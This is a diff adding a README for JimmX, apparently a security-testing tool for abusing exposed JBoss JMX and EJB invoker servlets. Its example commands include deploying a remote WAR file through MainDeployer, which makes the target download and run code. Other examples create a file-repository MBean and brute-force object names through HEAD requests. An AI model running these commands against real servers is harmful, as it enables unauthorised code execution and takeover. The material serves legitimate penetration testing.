@@ -1,0 +1,107 @@
+
+-- Introduction ------------------------------------------------
+
+ JimmX provides a good way to interact with the JMXInvokerServlet and
+ EJBInvokerServlet servlets. 
+
+ Supported JBoss AS version:
+	- JBoss 4.x
+	- JBoss 5.x
+
+ JBoss 3.x and JBoss 6.x are not supported yet. 
+
+
+-- Compilation -------------------------------------------------
+
+ You can easily compile this tool with Ant. However, if you want to 
+ prove that you are a Java Compilation Master Certified, I let you 
+ find the suitable "javac" command yourself :]
+
+
+-- Usage -------------------------------------------------------
+
+ Usage: jimmix.sh [options] <operation> <mbean> <params>
+ 	-m, --method method		HTTP method
+ 	-t, --type type			Proxy type (default is jmxinvokerservlet)
+ 	-P, --proxy proxy		HTTP(S) proxy server.
+ 	-H, --host host			Host header
+ 	-U, --ua ua			User-Agent header (default is Mozilla/5.0)
+ 	-i, --invoker url		The JMX Invoker Servlet URL.
+ 	-u, --user user			Authentication username.
+ 	-p, --password password		Authentication password.
+ 	-s, --signature signature	The invocation signature, comma separated (default is java.lang.String).
+
+ Several options are available:
+ 
+  * method: useful to run JMX command through another HTTP method (
+    HEAD, GET, etc.). The default is POST.
+
+  * type: the remote JMX proxy (webconsole or jmxinvokerservlet)
+ 
+  * proxy: intermediate HTTP(S) proxy (ex: 127.0.0.1:8080)
+
+  * host: host header.
+
+  * ua: user-agent to use. The default is "Mozilla/5.0".
+ 
+  * invoker: the remove invoker URL.
+
+  * user: the username to use when the invoker is authenticated.
+
+  * password: the password to use when the invoker is authenticated.
+
+  * signature: signature used to cast potential parameters for an
+    operation
+
+ Available operations:
+  
+  * createMBean: instanciate and register a mbean (only for jmxinvokerservlet)
+
+  * get: get a mbean attribute
+
+  * invoke: invoke a mbean's method
+
+  * queryNames: look for mbean objectnames (only for jmxinvokerservlet)
+
+  * unregister: unregister a mbean (only for jmxinvokerservlet)
+
+  * bfobjectname: bruteforce an objectname, useful when only HEAD
+    is available (only for jmxinvokerservlet)
+
+
+-- Examples ----------------------------------------------------
+
+ * Get an attribute (like the OS version):
+
+$ jimmix.sh -i http://jboss/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSVersion
+
+ * Invoke a method:
+
+$ jimmix.sh -i http://jboss/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy http://remote/appli.war
+
+ * Looking for a mbean:
+
+$ jimmix.sh -i http://jboss/invoker/JMXInvokerServlet queryNames jboss.classloader:*
+
+ * Create a mbean
+
+$ jimmix.sh -i http://target/invoker/JMXInvokerServlet \
+  createMBean jboss.admin:service=DeploymentFileRepository \
+  org.jboss.console.manager.DeploymentFileRepository \
+  'jboss.classloader:id="vfsfile:/home/jboss/prod/server/default/deploy/management/console-mgr.sar/"'
+
+ * Bruteforce an object name with HEAD HTTP request:
+
+$ jimmix.sh -m HEAD -i http://target/invoker/JMXInvokerServlet bfobjectname \ 
+  'jboss.classloader:id="vfsfile:/JIMMX/server/default/deploy/management/console-mgr.sar/"'
+
+Put the word "JIMMX" where you want to bruteforce (however it must respects the objectname
+structure: <domain>:<key>=<value>).
+
+
+-- Contact -----------------------------------------------------
+
+For questions, bug reports, ideas, contributions etc. please contact
+renaud.dubourguais@synacktiv.com
+
+
